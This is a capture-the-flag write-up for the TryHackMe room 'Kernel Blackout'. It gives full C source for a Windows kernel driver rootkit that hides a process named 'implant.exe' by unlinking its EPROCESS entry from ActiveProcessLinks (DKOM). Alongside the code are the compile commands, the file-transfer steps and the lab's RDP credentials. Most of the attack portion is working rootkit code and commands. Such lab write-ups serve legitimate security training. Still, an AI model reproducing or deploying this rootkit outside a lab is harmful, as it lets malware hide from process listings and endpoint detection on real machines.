# [Kernel Blackout](https://tryhackme.com/room/kernelblackout)

## Blue pill: stay in user mode, trust the documented APIs, and never question what lies beneath. Red pill: drop into kernel mode and see how deep the rabbit hole goes.

OPERATION: KERNEL BLACKOUT

\> Access instance data: http://10.200.150.10 @Target; http://10.200.150.20 @MalwareDev
\> Build a rootkit to hide the implant process on MalwareDev with the x64 Visual Studio console.\
\> Authenticate on MalwareDev via RDP using: User:Administrator / Password:KernelKernel2323\
\> Once ready, upload the rootkit and deploy it to the Target machine.\
\> Confirm the process is hidden and get the flag! Note that killing the implant process will not give you the flag.

### What's the flag?

1. Recon - MalwareDev dashboard

Browsing to `http://10.200.150.20` shows a small dashboard for the malware-development box. Scrolling down, the page lists the running implant with its PID.

This confirms the target process name we need to hide: `implant.exe`.

[SCREEN01]

2. Recon - WinDbg / EPROCESS layout

Scrolling further down the same page, a `WINDBG_CONSOLE` panel shows the output of a `dt nt!_EPROCESS` dump for the running kernel version, listing the offsets we'll need:.

```
+0x2e0 UniqueProcessId : Ptr64 Void
+0x2e8 ActiveProcessLinks : _LIST_ENTRY
...
+0x450 ImageFileName : [15] UChar
```

- **`UniqueProcessId`** (`+0x2e0`) - the PID, stored as a pointer-sized value.
- **`ActiveProcessLinks`** (`+0x2e8`) - a `LIST_ENTRY` that threads every running `EPROCESS` structure together. This is the list Task Manager, `tasklist`, and most user-mode/EDR enumeration APIs ultimately walk to produce a process list.
- **`ImageFileName`** (`+0x450`) - a fixed 15-byte ASCII buffer holding the short image name.

These offsets are specific to the Windows build running on the target. Always verify them with `dt nt!_EPROCESS` rather than hard-coding values from a different build.

3. RDP into MalwareDev

The rootkit has to be compiled on MalwareDev, which has the Windows Driver Kit and Visual Studio 2022 build tools installed. Connect over RDP:

```bash
xfreerdp /v:10.200.150.20 /u:Administrator /p:'KernelKernel2323' /cert:ignore
```

4. The concept: DKOM

Rather than hooking API calls or filtering output in user mode, a kernel driver can directly patch the kernel's own data structures. Here, we perform classic DKOM process hiding:

- Walk the `ActiveProcessLinks` doubly linked list starting from `PsInitialSystemProcess`.
- For each `EPROCESS`, read the `ImageFileName` field and compare it against `"implant.exe"`.
- Once found, unlink that `EPROCESS`'s `LIST_ENTRY` from the list by repointing its neighbors' `Flink`/`Blink` around it, then point the removed entry's own `Flink`/`Blink` back at itself.

Because the process object itself, its threads, and its PID are untouched, the process keeps running and keeps handling I/O normally. It simply vanishes from anything that enumerates processes via `ActiveProcessLinks`, which is why killing the process instead of hiding it does not satisfy the room's check: the check is presumably confirming the implant is both alive **and** absent from the process list.

5. **`hide.c`**

```c
#include <ntddk.h>

#define LINKS_OFFSET  0x2e8
#define NAME_OFFSET   0x450

void DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    PEPROCESS CurrentProcess = PsInitialSystemProcess;

    for (int i = 0; i < 2000; i++) {
        char* currentName = (char*)CurrentProcess + NAME_OFFSET;

        if (strncmp(currentName, "implant.exe", 11) == 0) {
            PLIST_ENTRY CurrentListEntry = (PLIST_ENTRY)((char*)CurrentProcess + LINKS_OFFSET);
            PLIST_ENTRY Prev = CurrentListEntry->Blink;
            PLIST_ENTRY Next = CurrentListEntry->Flink;

            Prev->Flink = Next;
            Next->Blink = Prev;

            CurrentListEntry->Flink = CurrentListEntry;
            CurrentListEntry->Blink = CurrentListEntry;
            break;
        }

        PLIST_ENTRY CurrentListEntry = (PLIST_ENTRY)((char*)CurrentProcess + LINKS_OFFSET);
        CurrentProcess = (PEPROCESS)((char*)CurrentListEntry->Flink - LINKS_OFFSET);
    }
    return STATUS_SUCCESS;
}
```

6. Compiling the driver

Open **x64 Native Tools Command Prompt for VS 2022** and run:

```bash
cd "C:\Users\Administrator.WIN-CTF-01\Desktop"
cl /W4 /D_AMD64_ /D_WIN64 /D_KERNEL_MODE hide.c /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\km" /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\shared" /link /driver /entry:DriverEntry /subsystem:native /out:hide.sys "C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\km\x64\ntoskrnl.lib"
```

[SCREEN02]

A few notes on this build line that are easy to trip over:

- `/D_KERNEL_MODE` is what makes `ntddk.h` expose kernel-only definitions instead of erroring out as if compiling user-mode code.
- `/link /driver /entry:DriverEntry /subsystem:native` tells the linker to produce a kernel-mode driver image with `DriverEntry` as its entry point rather than a normal `main`/`WinMain`.
- The path to `ntoskrnl.lib` must match the installed WDK/SDK version `10.0.19041.0` here. Check `C:\Program Files (x86)\Windows Kits\10\Lib\` if the build fails with unresolved externals, since a different SDK version may be installed instead.
- The target machine's Windows build must be recent enough that Driver Signature Enforcement will allow the driver to load. Since `hide.sys` is unsigned, this generally requires **test signing mode** to already be enabled on Target. The room's Target VM is pre-configured for this so the driver loads without needing to sign it yourself, but it's worth checking if the load step fails.

7. Transferring the driver to Target and get the flag

On MalwareDev, encode the compiled driver:

```bash
certutil -encode hide.sys base64.txt
```

Decode it back into a valid `.sys` using the Linux base64 utility:

```bash
base64 -d base64.txt > hide.sys
```

Upload the file and refresh the page to get flag

[SCREEN03]
